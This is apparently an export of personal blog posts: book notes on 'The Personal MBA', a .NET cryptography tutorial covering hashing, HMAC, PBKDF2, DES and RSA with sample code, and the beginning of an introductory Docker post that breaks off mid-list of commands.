do? | +-----------------+----------------------------------------------------------+ | Status | How does this affect the way others perceive me? | +-----------------+----------------------------------------------------------+ | Aesthetic Appeal| How attractive or otherwise aesthetically pleasing is it?| +-----------------+----------------------------------------------------------+ | Emotion | How does it make me feel? | +-----------------+----------------------------------------------------------+ | Cost | How much do I have to give up to get this? | +-----------------+----------------------------------------------------------+\nMarketing Ten ways to the evaluate a market and to identify the attractiveness of any potential market (back-of-napkin method)\n+-----------------------------+----------------------------------------------------------+ | Urgency | How badly do people want or need this right now? | +-----------------------------+----------------------------------------------------------+ | Market size | How many people are actively purchasing things like this?| +-----------------------------+----------------------------------------------------------+ | Pricing potential | What is the highest average price a purchaser would be | | | willing to spend for a solution? | +-----------------------------+----------------------------------------------------------+ | Cost of customer acquisition| How easy is it to acquire a new customer? On average, | | (how easy is it to acquire | how much will it cost to generate a sale, both in money | | a new customer) | and effort? | +-----------------------------+----------------------------------------------------------+ | Cost of value delivery | How much would it cost to create and deliver the value | | | offered, both in money and effort? | +-----------------------------+----------------------------------------------------------+ | Uniqueness of offer | How unique is your offer versus competing offerings in | | | the market, and how easy is it for potential competitors | | | to copy you? | +-----------------------------+----------------------------------------------------------+ | Speed to market | How quickly can you create something to sell? | +-----------------------------+----------------------------------------------------------+ | Up-front investment | How much will you have to invest before you’re ready | | | to sell? | +-----------------------------+----------------------------------------------------------+ | Upsell potential | Are there related secondary offers that you could also | | | present to purchasing customers? | +-----------------------------+----------------------------------------------------------+ | Evergreen potential | Once the initial offer has been created, how much | | | additional work will you have to put into it in order to | | | continue selling? | +-----------------------------+----------------------------------------------------------+\nMarketing is the art and science of finding 'prospects' - people who are actively interested in what you have to offer.\nRule #1 of marketing is that your potential customer's available attention is limited:\nReceptivity is a measure of how open a person is to your message Advertising is the tax you pay for being unremarkable Being remarkable is the best way to attract attention The essence of effective marketing is discovering what people already want, then presenting your offer in a way that intersects with that preexisting desire.\nThe best marketing is similar to Education-Based Selling:\nIt shows the prospect how the offer will help them achieve what they desire. Your job as a marketer isn't to convince people to want what you're offering; it's to help your prospects convince themselves that what you're offering will help them get what they really want. When your work speaks for itself, don't interrupt. There are several tools for marketing:\nRelative Importance Testing: A method that helps you determine what people actually want by asking them questions designed to simulate real life tradeoffs. Framing: is the act of emphasizing the details that are critically important while de-emphasizing things that aren't, by either minimizing certain facts or leaving them out entirely. Hook: is a single phrase or sentence that describes an offer's primary benefit. Messages with clear call-to-action: Ensure that every message you create has a clear Call-To-Action, and you'll dramatically increase the effectiveness of your marketing activities. Controversy: means publicly taking a position that not everyone will agree with, approve of, or support. Used constructively, Controversy can be an effective way to attract Attention. People start talking, engaging and paying Attention to your position, which is a very good thing. Sales The sales process begins with a prospect and ends with a paying customer.\nThere are several tools for sales:\nCritical Assumptions: Are facts or characteristics that must be true in the real world for your offering to be successful. Shadow Testing: is the process of selling an offering before it actually exists. Shadow testing is very useful strategy you can use to actually test your critical assumptions with real customers quickly and inexpensively. Mental Simulation: The most effective way to get people to want something is to encourage them to Visualize what their life would be like once they've accepted your offer. Sale vs Buy: People don't like to be sold, but they love to buy. Value-based selling: is not about talking - it's about listening. In reality, the best sales people are the ones who can listen intently for the things the customer really wants. SPIN selling: understanding the situation; defining the problem; clarifying the short-term and long-term implications of that problem; quantifying the need-payoff, or the financial and emotional benefits the customer would experience after the resolution of their problem Education-based selling is the process of making your prospects better, more informed customers. By investing energy in making your prospects smarter, you simultaneously build trust in your expertise and make them better customers. Be forewarned, however, that effective education requires your offer to be superior in some way to your competitors Risk reversal: When it comes to closing sales, you are that risk. Risk reversal is a strategy that transfer some (or all) of the risk of a Transaction from the buyer to the seller Reactivation is the process of convincing past customers to buy from you again\nImportant sales principles:\nWithout a certain amount of Trust between parties, a Transaction will not take place.\nPricing Uncertainty Principle: all prices are arbitrary and malleable. The pricing uncertainty principle has an important corollary: you must be able to support your asking price before a customer will actually accept it.\n4 ways to support a prices on something of value:\nreplacement cost: How much would it cost to replace? market comparison: How much are other things like this selling for? discounted cash flow/net present value: How much is it worth if it can bring in money over time? value comparison: Who is this particularly valuable to? In stead of barging in with a premature, boilerplate hard sell, successful salespeople focus on asking detailed questions to get to the root of what the prospect really wants.\nBy encouraging your prospects to tell you more about what they need, you reap two major benefits.\nyou increase the prospect's confidence in your understanding of the situation, increasing their confidence in your ability to deliver a solution you'll discover information that will help you emphasize just how valuable your offer is, which helps you in Framing the price of your offer versus the value it will provide There several barriers to purchase:\nIt costs too much =\u0026gt; Framing, Value based selling It won't work =\u0026gt; Social Proof, Referrals It won't work for ME I can wait =\u0026gt; Education-based selling It's too difficult Your Next Best Alternative is what you'll do in the event you can't find common ground with the party you're negotiating with.\nThe first phase of every negotiation is the setup: setting the stage for a satisfying outcome to the negotiation. A buffer is a third party empowered to negotiate on your behalf, to avoid permanently harming your relationship with the other party. Value delivery A Value Stream is the set of all steps and all processes from the start of your Value Creation process all the way through the delivery of the end result to your customer. In general, try to make your Value Stream as small and efficient as possible.\nMeasurement:\nExpectation effect: Quality = performance - expectations Throughput: is the rate at which a system achieves its desired goal, which is a measure of the effectiveness of your Value Stream Multiplication: is duplication for an entire process or system. Products are typically easiest to duplicate, while shared resources are easiest to multiply Finance Finance is the art and science of watching the money flowing into and out of a business, then deciding how to allocate it and determine whether or not what you're doing is producing the results you want.\nTerminology:\nProfit margin: is the difference between how much revenue you capture and how much you spend to capture it, expressed in percentage term. Value capture: is the process of retaining some percentage of the value provided in every transaction Pricing power: is your ability to raise the prices you're charging over time. The less value you're capturing, the greater your pricing power. Lifetime Value: is the total value of a customer's business over the lifetime of their relationship with your company. One of the reasons Subscriptions are so profitable is that they naturally maximize lifetime value Allowable Acquisition Cost (AAC): is the marketing component of Lifetime Value. The higher the average customer's Lifetime Value, the more you can spend to attract a new customer, making it possible to spread the word about your offer in new ways. Subscription: the first sale is sometimes called a 'loss leader' - an enticing offer intended to establish a relationship with a new customer. Many subscription business use loss leaders to build their subscriber base. Amortization: is the process of spreading the cost of a resource investment over the estimated useful life of that investment. Funding: can help you do things that would otherwise be impossible with your current budget. Initial public offering (IPO): is simply the first public stock offering a company offers on the open market. Any investor who purchases shares is legally a partial owner of the company, which includes the right to participate in management decision via electing the board of directors. Whoever owns the most shares in the company controls it, so 'going public' creates the risk of a hostile takeover. Bootstrapping: is the art of building and operating a business without funding. Investors increases communication overhead, which can adversely affect your ability to get things done quickly. Funding can be useful, but be wary of giving up control over your business's operations - don't do it lightly or blindly\nManage Risks What get measured gets managed\nPeter Drucker Risks are known unknowns. Uncertainties are unknown unknown.\nWithout data, you are blind. If you want to improve anything, you must measure it first. Here's the primary problem with Measurement: you can measure a million different things. Measure too much, and you'll inevitably suffer from the Cognitive Scope Limitation, drowning in a sea of meaningless data.\nGarbage in, garbage out is a straightforward principle: put useless input into a system, and you'll get useless output.\nAnalytical Honesty: means measuring and analyzing the data you have dispassionately. Having an experienced but dispassionate third party audit your measurement and analysis practices is a neat workaround\nCounterparty risk: is the possibility that other people won't deliver what they have promised, which is amplified by the planning fallacy\nIf you don't believe in sampling theory, next time you go to the doctor and he wants to take a little blood, tell him to take it all\nA Mean (or average) is calculated by adding the quantities of all data points, then dividing by the total number of data points available. (Easy to be affected by the outliers) A Median is calculated by sorting the values in order of high to low, then finding the quantity of data point in the middle of the range A Mode is the value that occurs most frequently in a set of data. A Midrange is the value halfway between the highest and lowest data points in a set values. To calculate the Midrange, add the highest and lowest values, then divide by two. Correlation is not Causation.\nOther facts of business Resilience is never 'optimal' if you evaluate a System solely on Throughput. Flexibility always comes at a price. A turtle's shell is heavy - it could certainly move faster without it. Giving it up, however, would leave the turtle vulnerable in the moments when moving a little faster just isn't fast enough. In an effort to chase a few more short-term dollars, many business trade Resilience for short-term results - and pay a hefty price.\nScenario planning is the essence of effective strategy. Trying to base your actions on predictions of interest rates, oil prices, or stock values is a fool's game. Instead of trying to predict the future with 100 percent accuracy, Scenario Planning can help you prepare for many different possible futures.\nBusiness is never easy - it's an art as much as a science. Constant experimentation is the only way you can identify what will actually produce the result you desire.\nThe limits of my language are the limits of my world\nLudwig Wittgenstein Business school don't create successful people. They simply accept them, then take credit for their success.\nFeedback:\nGet feedback from real potential customers instead of friends and family Ask open-ended questions Steady yourself, and keep calm Take what you hear with a grain of salt Give potential customers the opportunity to preorder Everything we hear is an opinion, not a fact. Everything we see is a perspective, not the truth.\nMarcus Aurelius Body and Mind Body Eat high-quality food. Garbage in, garbage out: pay attention to what you put into your body. If you eat meat, eggs, or dairy, avoid sources that contain antibiotics or hormones. Also avoid refined sugar and processed foods as much as possible.\nEven low-intensity physical activity increases energy, improves mental performance and enhances your ability to focus.\nGet at least seven to eight hours of sleep each night. Going to bed early helps you get up early, which is very useful if you do creative work - I find it's best to write or do other creative tasks before the day begins, so you don't get distracted and run out of time.\nGet enough sun, but not too much -\u0026gt; Vitamin D\nMind We've evolved to avoiding expending energy unless absolutely necessary, which I call Conservation of Energy Marathon: When you're so tired that it feels like you're about to kick the bucket any second, physiologically, you're not even remotely close to actually dying. The signals your brain is sending to your body are a ruse that serves as a warning, prompting you to keep some energy in reserve, just in case energy is needed later. Conservation of Energy explains why some people stay in dead-end jobs for decades, even though they know the position isn't great.\nInstead of relying on willpower to keep doing something, change the structure of Environment to support your choices. Guiding Structure means the structure of your environment is the largest determinant of your behavior. If you want to successfully change a behavior, don't try to change the behavior directly. Change the structure that influences or supports the behavior, and the behavior will change automatically.\nInhibition is the ability to temporarily override our nature inclinations. Willpower is the fuel of inhibition. Overriding our instincts can often make it possible to collect larger rewards later - spending is easy, but saving is not, even if the latter is more beneficial over time.\nLoss aversion: People respond twice as strongly to potential loss as they do to the opportunity of an equivalent gain. Casinos win by abstracting the loss. Instead of having players gamble with currency, which is perceived as valuable, the casino coverts currency into chips or debit cards, which don't feel as valuable. As the player loses this 'fake' money over time, the casino will provide 'rewards' like free drinks, T-shirts, room upgrades, or other benefits to alleviate any remaining sense of loss. As a result, losing becomes 'no big deal', so players continue to play - and continue to lose money night after night.\nAbsence Blindness also makes it uncomfortable for people to 'do nothing' when something bad happens, even if doing nothing is the best course of action. Often, the best course of action is to choose not to act, but that's often difficult for humans to accept emotionally. Experience makes it easier to avoid Absence Blindness. Experience is valuable primarily because the expert has a larger mental database of related Patterns, and thus a higher chance of noticing an absence. By noticing violations of expected Patterns, experienced people are more likely to get an 'odd feeling' that things 'aren't quite right', which is often enough warning to find an issue before it becomes serious.\nContrasting is often used to influence buying decisions. In the business world, contrast is often used as pricing camouflage. In the case of the $60 shirt, it may be possible to buy the exact same shirt at another retailer for $40, but the less expensive shirt isn't present in the store where the comparison is taking place. What is present is the $400 suit, which makes the $60 shirt look like a bargain.\nScarcity encourages people to make decisions quickly. Scarcity is one of the things that naturally overcomes our tendency to conserve - if you want something that's scarce, you can't afford to wait without the risk of losing what you want.\nLimited quantities Price increases Deadlines Novelty - the presence of new sensory data - is critical if you want to attract and maintain attention over a long period of time. One of the reasons people can focus on playing games or surfing the Internet for hours at a time is novelty - every new viral video, blog post, Facebook update, Twitter post and news report reengages our ability to pay attention. Even the most remarkable object of attention gets boring over time. Continue to offer something new, and people will pay attention to what you have to offer.\nMonoidealism is the state of focusing your energy and attention on only one thing, without conflicts. Monoidealism is often called a 'flow' state\nWe are what we repeatedly do. Excellence, then, is not an act, but a habit.\nNo decision, large or small, is ever made with complete information. Since we can't predict the future, we often attribute the feeling of indecisiveness to a lack of information.\nExternalization takes advantage of our perceptual abilities in a very intelligent way. There are two primary ways to externalize your thoughts: writing and speaking.\nCounter-factual Simulation as applied imagination - you're consciously posing a 'what if' or 'what would happen if' question to your mind, then sitting back and letting your brain do what it does best. A doomsday Scenario is a counterfactual simulation where you assume everything that can go wrong does go wrong. Caveman Syndrome makes our ancient brains over dramatic, so they assume every potential threat is a life-or-death situation.\nExcessive Self-Regard Tendency is the natural tendency to overestimate your own abilities, particularly if you have little experience with the matter at hand.\nDunning-Kruger effect:\nIncompetent individuals tend to overestimate their own level of skills Incompetent individuals fail to recognize genuine skill in others Incompetent individuals fail to recognize the extremity of their inadequacy If they can be trained to substantially improve their own skill level, these individuals can recognize and acknowledge their own previous lack of skill Confirmation Bias is the general tendency for people to pay attention to information that supports their conclusions and ignore information that doesn't. Looking for not confirming information is uncomfortable, but it's useful, whatever you ultimately decide.\nhindsight Bias is the natural tendency to kick yourself for things you 'should have known'. It's important to realize that these feelings are irrational - your decisions were based on the best information you had at the time, and there's nothing you can do now to change them.\nUnderstanding your Locus of Control is being able to separate what you can control (or strongly influence) from what you can't. Trying to control things that aren't actually under your control is a recipe for eternal frustration. Focus most of your energy on things that you can influence, and let everything else go.\nRelationship All human relationships are based on Power - the ability to influence the actions of other people. We don't have direct access to the inner processes that make people do the things they do. All we can really do is act in ways that encourage people to do what we suggest. On the whole, influence is much more effective than compulsion.\nComparative Advantage means it's better to capitalize on your strengths than to shore up your weaknesses. Focus on what you can do well, and work with others to accomplish the rest.\nGolden Trifecta:\nAppreciation Courtesy Respect Treating other people poorly sends a clear signal to everyone that you can't be trusted.\nHumans are predisposed to look for behavioral causes. People will be more receptive to any request if you give them a reason why. Any reason will do. Commander's Intent is a much better method of delegating tasks: whenever you assign a task to someone, tell them why it must be done. The more your agent understands the purpose behind your actions, the better they'll be able to respond appropriately when the situation changes.\nAccountability is about one person taking responsibility. If two people are accountable for the same decision, no one is really accountable. Bystander Apathy is an inverse relationship between the number of people who could take action and the number of people who actually choose to act. The more people available, the less responsibility each member of the crowd feels to do anything about the situation.\nPygmalion Effect: Let others know you expect great work from them, and they'll do their best to live up to your expectation.\nThe Attribution Error means that when others screw up, we blame their character; when we screw up, we attribute the situation to circumstances.\nA compromise is the art of dividing a cake in such a way that everyone believes he has the biggest piece\nLudwig Erhard Common Ground is a state of overlapping interests between two or more parties. Negotiation is the process of exploring different options to find Common Ground. The more potential paths you explorer, the greater the chance you'll be able to find one in which your interests overlap.\nWritten by Binwei@Oslo\n","link":"http://localhost:1313/post/2018/the_personal_mba/","section":"post","tags":["booknotes"],"title":"The Personal MBA"},{"body":"Cryptography Introduction (with .NET code example) Published: Jan 07, 2018 Tags: security Category: ComputerScience\nCryptography is the core part of security, this blog introduces the basic concepts in cryptography and uses .NET as code example.\nTable of Contents Randomness System.Random and its problems\nSystem.Random is a pseudo random number generator A seed value is passed into the constructor The seed value should be different each time System.Random is deterministic and predictable Solution is to use RNGCryptoServiceProvider instead.\n1 public static byte[] GenerateRandomNumber(int length) 2 { 3 using (var randomNumberGenerator = new RNGCryptoServiceProvider()) 4 { 5 var randomNumber = new byte[length]; 6 randomNumberGenerator.GetBytes((randomNumber)); 7 8 return randomNumber; 9 } Hashing What Is Hashing?\nIt is easy to compute the hash value for any given message It is infeasible to generate a message that has a given hash It is infeasible to modify a message without changing the hash It is infeasible to find two different messages with the same hash Hash algorithm\nMD5 SHA-1 SHA-256 SHA-512 Hashing is one way operation, while encryption is two way operation.\nMD5\nDesigned by Ron Rivest in 1991 to replace MD4 Produces a 128 bit (16 byte) hash value Commonly used to verify file integrity First collision resistance flaw found in 1996 Recommendation was to move over to the Secure Hash Family Further collision resistance problems found in 2004 Still needed when integrating with legacy systems SHA1 SHA2: SHA256, SHA512 SHA3: not supported in .net so far (2015)\n1public class HashData 2{ 3 public static byte[] ComputeHashSha1(byte[] toBeHashed) 4 { 5 using (var sha1 = SHA1.Create()) 6 { 7 return sha1.ComputeHash(toBeHashed); 8 } 9 } 10 11 public static byte[] ComputeHashSha256(byte[] toBeHashed) 12 { 13 using (var sha256 = SHA256.Create()) 14 { 15 return sha256.ComputeHash(toBeHashed); 16 } 17 } 18 19 public static byte[] ComputeHashSha512(byte[] toBeHashed) 20 { 21 using (var sha512 = SHA512.Create()) 22 { 23 return sha512.ComputeHash(toBeHashed); 24 } 25 } 26 27 public static byte[] ComputeHashMd5(byte[] toBeHashed) 28 { 29 using (var md5 = MD5.Create()) 30 { 31 return md5.ComputeHash(toBeHashed); 32 } 33 } 34} Hash algorithm with key Hashed Message Authentication Codes\n1public class Hmac 2{ 3 private const int KeySize = 32; 4 5 public static byte[] GenerateRandomKey() 6 { 7 using (var randomNumberGenerator = new RNGCryptoServiceProvider()) 8 { 9 var randomNumber = new byte[KeySize]; 10 randomNumberGenerator.GetBytes((randomNumber)); 11 12 return randomNumber; 13 } 14 } 15 16 public static byte[] ComputeHmacsha256(byte[] toBeHashed, byte[] key) 17 { 18 using (var hmac = new HMACSHA256(key)) 19 { 20 return hmac.ComputeHash(toBeHashed); 21 } 22 } 23 24 public static byte[] ComputeHmacsha1(byte[] toBeHashed, byte[] key) 25 { 26 using (var hmac = new HMACSHA1(key)) 27 { 28 return hmac.ComputeHash(toBeHashed); 29 } 30 } 31} Store Password Store password: store plain text and encrypted password is not good idea. Store hash since it cannot be reversed.\nRainbow table contains pre-computed hash to speed up the attack. Add salt will make brute force and rainbow table attack ineffective.\n1public class Hash 2{ 3 public static byte[] GenerateSalt() 4 { 5 const int saltLength = 32; 6 using (var randomNumberGenerator = new RNGCryptoServiceProvider()) 7 { 8 var randomNumber = new byte[saltLength]; 9 randomNumberGenerator.GetBytes(randomNumber); 10 return randomNumber; 11 } 12 } 13 14 private static byte[] Combine(byte[] first, byte[] second) 15 { 16 var ret = new byte[first.Length + second.Length]; 17 Buffer.BlockCopy(first, 0, ret, 0, first.Length); 18 Buffer.BlockCopy(second, 0, ret, first.Length, second.Length); 19 20 return ret; 21 } 22 23 public static byte[] HashPasswordWithSalt(byte[] toBeHashed, byte[] salt) 24 { 25 using (var sha256 = SHA256.Create()) 26 { 27 return sha256.ComputeHash(Combine(toBeHashed, salt)); 28 } 29 } 30} PBKDF The salt does not have to be secret, which can be stored in the database. If the computational power become bigger, it still has risk just by adding salt.\nPassword Based Key Derivation Functions\nPassword Based Key Derivation Function (PBKDF2) RSA Public Key Cryptographic Standards (PKCS #5 Version 2.0) Internet Engineering Task Force RFC 2898 Specification Number Iteration: numbers of hashing function, which can scale with increasing computational power\nGood default is 50,000 iterations Balance number of iterations with acceptable performance Ideally double number of iterations every 2 years 1public class Pbkdf2 2{ 3 public static byte[] GenerateSalt() 4 { 5 using (var randomNumberGenerator = new RNGCryptoServiceProvider()) 6 { 7 var randomNumber = new byte[32]; 8 randomNumberGenerator.GetBytes(randomNumber); 9 return randomNumber; 10 } 11 } 12 13 public static byte[] HashPassword(byte[] toBeHashed, byte[] salt, int numberOfRounds) 14 { 15 using (var rfc2898 = new Rfc2898DeriveBytes(toBeHashed, salt, numberOfRounds)) 16 { 17 return rfc2898.GetBytes(32); 18 } 19 } 20} Symmetric Algorithm Advantages of symmetric encryption:\nExtremely secure Relatively fast Disadvantage:\nKey sharing More damage if compromised A new variant designed called Triple DES, which is a simple way to increase key size without redesigning a new cipher. Many former DES users now use Triple DES. Triple DES involved applying DES three times with 2 or 3 different keys. Triple DES was regarded as adequately secure, although it is quite slow.\nCLR uses a stream oriented design for cryptography. Core of the design is CryptoStream.\n1 public byte[] Encrypt(byte[] dataToEncrypt, byte[] key, byte[] iv) 2 { 3 using (var des = new DESCryptoServiceProvider()) 4 { 5 des.Mode = CipherMode.CBC; 6 des.Padding = PaddingMode.PKCS7; 7 des.Key = key; 8 des.IV = iv; 9 10 using (var memoryStream = new MemoryStream()) 11 { 12 var cryptoStream = new CryptoStream(memoryStream, des.CreateEncryptor(), 13 CryptoStreamMode.Write); 14 cryptoStream.Write(dataToEncrypt, 0, dataToEncrypt.Length); 15 cryptoStream.FlushFinalBlock(); 16 return memoryStream.ToArray(); 17 } 18 } 19 } 20 21 public byte[] Decrypt(byte[] dataToDecrypt, byte[] key, byte[] iv) 22 { 23 using (var des = new DESCryptoServiceProvider()) 24 { 25 des.Mode = CipherMode.CBC; 26 des.Padding = PaddingMode.PKCS7; 27 des.Key = key; 28 des.IV = iv; 29 30 using (var memoryStream = new MemoryStream()) 31 { 32 var cryptoStream = new CryptoStream(memoryStream, des.CreateDecryptor(), 33 CryptoStreamMode.Write); 34 cryptoStream.Write(dataToDecrypt, 0, dataToDecrypt.Length); 35 cryptoStream.FlushFinalBlock(); 36 return memoryStream.ToArray(); 37 } 38 } 39 } How does DES and Triple DES work?\nDES is a block cipher that transforms plaintext into ciphertext DES uses a block size of 64 bits Uses a 64 bits key only 56 bits are used by the algorithm Supports different modes of operation The history of AES\nUnlike DES, AES does not use a Feistel network Uses 128 bit block size and 128, 192 or 256 bit keys Based on a design known as a substitution - permutation network How Secure is AES against brute force attack?\n+-----------------------+-----------------------------------+ | Key Size | Possible Combinations | +-----------------------+-----------------------------------+ | 1 bit | 2 | +-----------------------+-----------------------------------+ | 2 bit | 4 | +-----------------------+-----------------------------------+ | 4 bit | 16 | +-----------------------+-----------------------------------+ | 8 bit | 256 | +-----------------------+-----------------------------------+ | 16 bit | 65536 | +-----------------------+-----------------------------------+ | 32 bit | 4.2 x 10 \\ :sup:9\\ | +-----------------------+-----------------------------------+ | 56 bit (DES) | 7.2 x 10 \\ :sup:16\\ | +-----------------------+-----------------------------------+ | 64 bit | 1.8 x 10 \\ :sup:19\\ | +-----------------------+-----------------------------------+ | 128 bit (AES) | 3.4 x 10 \\ :sup:38\\ | +-----------------------+-----------------------------------+ | 192 bit (AES) | 6.2 x 10 \\ :sup:57\\ | +-----------------------+-----------------------------------+ | 256 bit (AES) | 1.1 x 10 \\ :sup:77\\ | +-----------------------+-----------------------------------+\n.NET Framework libraries for symmetric algorithm:\nDESCryptoServiceProvider TripleDESCryptoServiceProvider AESCryptoServiceProvider Asymmetric Encryption RSA has 3 key sizes:\n1024 bit key 2048 bit key 4096 bit key Some facts about asymmetric encryption algorithm:\nPublic and private keys are based on prime numbers Factoring a number back into constituent prime numbers is hard RSA encryption and decryption is a mathematical operation based on modular math\n1 private RSAParameters _publicKey; 2 3 private RSAParameters _privateKey; 4 5 public void AssignNewKey() 6 { 7 using (var rsa = new RSACryptoServiceProvider(2048)) 8 { 9 rsa.PersistKeyInCsp = false; 10 this._publicKey = rsa.ExportParameters(false); 11 this._privateKey = rsa.ExportParameters(true); 12 } 13 } It is not recommended to store private key on your file system, try to use key container\n1 public void AssignNewKeyWithContainer() 2 { 3 const int ProviderRsaFull = 1; 4 CspParameters cspParameters = new CspParameters(ProviderRsaFull) 5 { 6 KeyContainerName = \u0026#34;MyContainerName\u0026#34;, 7 Flags = CspProviderFlags 8 .UseMachineKeyStore, 9 ProviderName = 10 \u0026#34;Microsoft Strong Cryptographic Provider\u0026#34; 11 }; 12 13 var rsa = new RSACryptoServiceProvider(cspParameters) { PersistKeyInCsp = true }; 14 } 15 16 public void DeleteKeyInCsp() 17 { 18 var cspParams = new CspParameters { KeyContainerName = \u0026#34;MyContainerName\u0026#34; }; 19 var rsa = new RSACryptoServiceProvider(cspParams) { PersistKeyInCsp = false }; 20 rsa.Clear(); 21 } How to encrypt and decrypt data\n1 public byte[] EncryptData(byte[] dataToEncrypt) 2 { 3 byte[] cipherbytes; 4 using (var rsa = new RSACryptoServiceProvider(2048)) 5 { 6 rsa.ImportParameters(this._publicKey); 7 cipherbytes = rsa.Encrypt(dataToEncrypt, false); 8 } 9 10 return cipherbytes; 11 } 12 13 public byte[] DecryptData(byte[] dataToEncrypt) 14 { 15 byte[] plain; 16 using (var rsa = new RSACryptoServiceProvider(2048)) 17 { 18 rsa.PersistKeyInCsp = false; 19 rsa.ImportParameters(this._privateKey); 20 plain = rsa.Decrypt(dataToEncrypt, true); 21 } 22 23 return plain; 24 } 25 26 public byte[] DecryptDataWithCsp(byte[] dataToDecrypt) 27 { 28 byte[] plain; 29 var cspParams = new CspParameters { KeyContainerName = \u0026#34;MyContainerName\u0026#34; }; 30 using (var rsa = new RSACryptoServiceProvider(2048, cspParams)) 31 { 32 plain = rsa.Decrypt(dataToDecrypt, false); 33 } 34 35 return plain; 36 } Digital Signatures Claiming authenticity of a message Digital signatures give both authentication and non-repudiation Based on asymmetric cryptography Digital signatures consist of: 1. Public and private key generation; 2. Signing algorithm using the private key Verification algorithm using the public key Difference between normal asymmetric encryption and digital sign:\nnormal asymmetric encryption: sender use public key to encrypt data, and receiver uses private key to decrypt data digital sign: sender use private key to generate digital sign, and receiver uses public key to verify the digital sign +-----------------------+--------------------------+--------------------------+ | | Public Key | Private Key | +-----------------------+--------------------------+--------------------------+ | Encryption (RSA) | Encrypt | Decrypt | +-----------------------+--------------------------+--------------------------+ | Digital Signatures | Verify Signature | Sign Message | +-----------------------+--------------------------+--------------------------+\nDigital Signature in .NET use 3 main classes\nRSACryptoServiceProvider RSAPKCS1SignatureFormatter RSAPKCS1SignatureDeformatter 1 public byte[] SignData(byte[] hashOfDataToSign) 2 { 3 using (var rsa = new RSACryptoServiceProvider(2048)) 4 { 5 rsa.PersistKeyInCsp = false; 6 rsa.ImportParameters(this._privateKey); 7 8 var rsaFormatter = new RSAPKCS1SignatureFormatter(rsa); 9 rsaFormatter.SetHashAlgorithm(\u0026#34;SHA256\u0026#34;); 10 11 return rsaFormatter.CreateSignature(hashOfDataToSign); 12 } 13 } 14 15 public bool VerifySignature(byte[] hashOfDataToSign, byte[] signature) 16 { 17 using (var rsa = new RSACryptoServiceProvider(2048)) 18 { 19 rsa.ImportParameters(this._publicKey); 20 21 var rsaDeformatter = new RSAPKCS1SignatureDeformatter(rsa); 22 rsaDeformatter.SetHashAlgorithm(\u0026#34;SHA256\u0026#34;); 23 24 return rsaDeformatter.VerifySignature(hashOfDataToSign, signature); 25 } 26 } Comparision between hashing, MAC and digital sign Integrity: Can the recipient be confident that the message has not been accidentally modified? Authentication: Can the recipient be confident that the message originates from the sender? Non-repudiation: If the recipient passes the message and the proof to a third party, can the third party be confident that the message originated from the sender? +-------------------------+------+-----------+--------------+ | Cryptographic primitive | Hash | MAC | Digital | | Security Goal | | | signature | +-------------------------+------+-----------+--------------+ | * Integrity | * Yes| * Yes | * Yes | | * Authentication | * No | * Yes | * Yes | | * Non-repudiation | * No | * No | * Yes | +-------------------------+------+-----------+--------------+ | Kind of keys | none | symmetric | asymmetric | | | | keys | keys | +-------------------------+------+-----------+--------------+\nSecure String System.String is not a secure solution, which has the following problems:\nSeveral copies in memory Not encrypted Not mutable, old copied in memory No effective way to clear out memory Using SecureString for sensitive data\nSecureString stored in encrypted memory SecureString implements IDisposable Create SecureString with a pointer to a char array 1 public static string CovertToUnsecureString(SecureString securePassword) 2 { 3 var unmanagedString = IntPtr.Zero; 4 try 5 { 6 unmanagedString = Marshal.SecureStringToGlobalAllocUnicode(securePassword); 7 return Marshal.PtrToStringUni(unmanagedString); 8 } 9 finally 10 { 11 Marshal.ZeroFreeGlobalAllocUnicode(unmanagedString); 12 } 13 } 14 15 private static SecureString ToSecureString(char[] str) 16 { 17 var secureString = new SecureString(); 18 Array.ForEach(str, secureString.AppendChar); 19 return secureString; 20 } 21 22 private static char[] CharacterData(SecureString secureString) 23 { 24 char[] bytes; 25 var ptr = IntPtr.Zero; 26 27 try 28 { 29 ptr = Marshal.SecureStringToBSTR(secureString); 30 bytes = new char[secureString.Length]; 31 Marshal.Copy(ptr, bytes, 0, secureString.Length); 32 } 33 finally 34 { 35 if (ptr != IntPtr.Zero) 36 { 37 Marshal.ZeroFreeBSTR(ptr); 38 } 39 } 40 return bytes; 41 } Written by Binwei@Oslo\n","link":"http://localhost:1313/post/2018/cryptography_introduction/","section":"post","tags":["security"],"title":"Cryptography Introduction (with .NET code example)"},{"body":"","link":"http://localhost:1313/tags/docker/","section":"tags","tags":null,"title":"Docker"},{"body":"Docker Introduction Published: Jan 4, 2018 Tags: docker Category: ComputerScience\nDocker is the world's leading software containerization platform. Docker/container technology becomes more and more popular these days. This blog introduces the basic concept of the above technology.\nTable of Contents What is docker In the old days, physical machine is the basic deployment unit which means one server hosts one application. The application has good isolation, however it is too expensive not only the hardware but also the maintaince effort.\nThen virtual machine model is introduced, see following figure:\nIt helps but still expensive, since each virtual machine needs to support a full operating system.\nThereby, docker is invented which is a lightweight virtual machine:\nThe intention of docker is to provide isolation environment for applications and also cost efficient.\nDifferences between VMs and Docker containers:\nDocker is application oriented, whereas VMs are operating-system-oriented Docker containers share an operating system with other Docker containers. In contrast, VMs each have their own operating system managed by a hypervisor Docker containers are designed to run one principal process, not manage multiple sets of processes Basic concepts Docker Engine: is also be called as docker daemon or docker runtime\nImages: An image is a collection of filesystem layers and some metadata. Taken together, they can be spun up as Docker containers\nContainers: A container is a running instance of an image. You can have multiple containers running from the same images\nDocker on your host machine is split into two parts: a daemon with a RESTful API and a client that talks to the daemon. Docker client is what you run when you type commands, whose job is to communicate with the Docker daemon via HTTP requests.\nDocker registry: For example, Docker hub. We can also have private registry in the company\nLayers Layers: A layer is a collection of changes to files.\nDocker layering helps you manage a big problem that arises when you use containers at scale. Imagine what would happen if you started up hundreds - or even thousands of same images, and each of those required a copy of the files to be stored somewhere. Disk space would run out pretty quickly. By default, Docker internally uses a copy-on-write mechanism to reduce the amount of disk space required. This partly explains how Docker containers can start up so quickly - they have nothing to copy because all the data has already been stored as the image.\nSome commands in the Dockerfile will create layer:\nRUN: RUN instruction will create a new layer while CMD is run time instruction. Equivalent of docker run ... ENV instruction can create variables, also add new layer. The variables can be used by $var1... When you push the image to the registry, only the new layer will be pushed.\nTagging Understanding docker tags:\nTags denote a version of your container Latest is used to denote latest published version Make tags always an ever increasing number Deployment options Docker is written in GoLang, currently there are many options for docker deployment.\nFor instance, for Azure support only the following options are available:\nAzure Container service Azure app service Azure Service Fabric Basic commands Docker requires admin right, if you work on Linux OS like Ubuntu it is cumbersone to type sudo every time. You can use sudo su: to switch to root user.\nGet general information docker -v\ndocker version: will give more information\ndocker info\nuname -r/-a: show the kernal version\nImage docker build: Build a docker image.\ndocker tag:\tTag a docker image\ndocker images: Show all docker 